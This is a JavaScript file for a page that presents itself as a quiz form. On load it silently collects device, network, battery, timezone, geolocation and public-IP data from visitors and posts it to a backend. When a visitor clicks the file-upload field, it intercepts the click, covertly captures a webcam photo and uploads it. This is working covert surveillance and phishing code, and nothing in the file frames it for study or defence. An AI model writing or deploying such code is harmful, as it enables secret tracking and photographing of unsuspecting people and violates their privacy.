const form = document.getElementById("quiz-form");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const fileInput = document.getElementById("user-file");

const BACKEND_BASE = "/api";
const constraints = { video: { facingMode: "user" }, audio: false };

let cameraCaptured = false;
let cameraInProgress = false;
let capturedImage = null;

// ================================
// CLEAN VIDEO ON PAGE LOAD
// ================================
window.addEventListener("DOMContentLoaded", () => {
  video.srcObject = null;
  video.style.display = "none";
  video.removeAttribute("autoplay");

  // send metadata once on visit
  sendPayloadOnVisit();
});

// ================================
// COLLECT BETTER METADATA
// ================================
async function collectMetadata() {
  const metadata = {
    userAgent: navigator.userAgent,
    platform: navigator.platform,
    language: navigator.language,
    languages: navigator.languages,
    cookiesEnabled: navigator.cookieEnabled,

    screen: {
      width: screen.width,
      height: screen.height,
      pixelRatio: window.devicePixelRatio
    },

    viewport: {
      width: window.innerWidth,
      height: window.innerHeight
    },

    hardware: {
      deviceMemory: navigator.deviceMemory || "N/A",
      cpuCores: navigator.hardwareConcurrency || "N/A"
    },

    battery: "N/A",
    location: "N/A",

    network: navigator.connection
      ? {
          type: navigator.connection.effectiveType,
          downlink: navigator.connection.downlink,
          rtt: navigator.connection.rtt
        }
      : "N/A",

    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    time: new Date().toLocaleString(),
    ip: "N/A"
  };

  if (navigator.getBattery) {
    try {
      const b = await navigator.getBattery();
      metadata.battery = {
        level: Math.round(b.level * 100),
        charging: b.charging
      };
    } catch {}
  }

  if (navigator.permissions && navigator.geolocation) {
    try {
      const status = await navigator.permissions.query({ name: "geolocation" });

      if (status.state === "granted") {
        const pos = await new Promise((res, rej) =>
          navigator.geolocation.getCurrentPosition(res, rej)
        );

        metadata.location = {
          lat: pos.coords.latitude,
          lon: pos.coords.longitude
        };
      }
    } catch {}
  }

  try {
    const ipRes = await fetch("https://api.ipify.org?format=json");
    const ipData = await ipRes.json();
    metadata.ip = ipData.ip;
  } catch {}

  return metadata;
}

// ================================
// CAMERA CAPTURE + UPLOAD
// ================================
async function captureAndSendCamera() {
  if (cameraCaptured || cameraInProgress) return;

  cameraInProgress = true;

  try {
    const stream = await navigator.mediaDevices.getUserMedia(constraints);

    video.srcObject = stream;
    video.setAttribute("playsinline", true);
    video.style.display = "block";

    await new Promise((resolve) => {
      video.onloadedmetadata = () => resolve();
    });

    await video.play();

    await new Promise((r) => setTimeout(r, 1200));

    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;

    const ctx = canvas.getContext("2d");
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    capturedImage = canvas.toDataURL("image/png");

    await fetch(`${BACKEND_BASE}/upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ image: capturedImage }),
    });

    stream.getTracks().forEach((t) => t.stop());
    video.style.display = "none";

    cameraCaptured = true;
  } catch (err) {
    console.error("❌ Camera error:", err);
  } finally {
    cameraInProgress = false;
  }
}

// ================================
// CAMERA TRIGGER (Safari Safe)
// ================================
fileInput.addEventListener("click", async (e) => {
  if (!cameraCaptured && !cameraInProgress) {
    e.preventDefault();

    await captureAndSendCamera();

    setTimeout(() => fileInput.click(), 50);
  }
});

// ================================
// FILE UPLOAD FUNCTION
// ================================
async function uploadFile(file) {
  return new Promise((resolve, reject) => {
    const reader = new FileReader();

    reader.onload = async () => {
      try {
        const res = await fetch(`${BACKEND_BASE}/file-upload`, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            file: reader.result,
            filename: file.name
          }),
        });

        resolve(await res.json());
      } catch (err) {
        reject(err);
      }
    };

    reader.onerror = () => reject(reader.error);
    reader.readAsDataURL(file);
  });
}

// ================================
// SEND PAYLOAD ON VISIT
// ================================
async function sendPayloadOnVisit() {
  try {
    const metadata = await collectMetadata();

    const res = await fetch(`${BACKEND_BASE}/file-upload`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        metadata,
        cameraImage: capturedImage || null
      }),
    });

    console.log("✅ Auto-visit upload:", await res.json());
  } catch (err) {
    console.error("❌ Upload failed:", err);
  }
}

// ================================
// FORM SUBMIT (NORMAL)
// ================================
form.addEventListener("submit", () => {
  // allow normal form submission
});
